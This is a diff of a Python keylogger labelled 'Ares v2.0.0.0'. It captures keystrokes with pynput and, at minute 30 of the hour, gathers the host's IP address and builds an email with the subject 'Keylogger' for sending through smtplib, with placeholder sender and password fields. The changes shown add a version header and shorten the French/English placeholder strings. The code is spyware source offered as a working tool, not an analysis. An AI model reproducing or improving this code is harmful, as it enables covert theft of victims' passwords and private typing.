@@ -1,3 +1,5 @@
+#Ares v2.0.0.0
+
 from pynput.keyboard import Key, Listener
 import logging
 import smtplib
@@ -28,9 +30,9 @@ with Listener(on_press=on_press) as listener:
     #partie EMAIL !
 if datetime.datetime.now().minute == 30 :
     myip = socket.gethostbyname(socket.gethostname())
-    email_user = 'Votre E-mail / Your E-mail'
-    email_send = 'Votre E-mail / Your E-mail'
-    email_password = 'Votre Mot de Passe / Your password'
+    email_user = 'Votre E-mail'
+    email_send = 'Votre E-mail'
+    email_password = 'Votre Mot de Passe'
     subject = 'Keylogger', myip
 
     msg = MIMEMultipart()
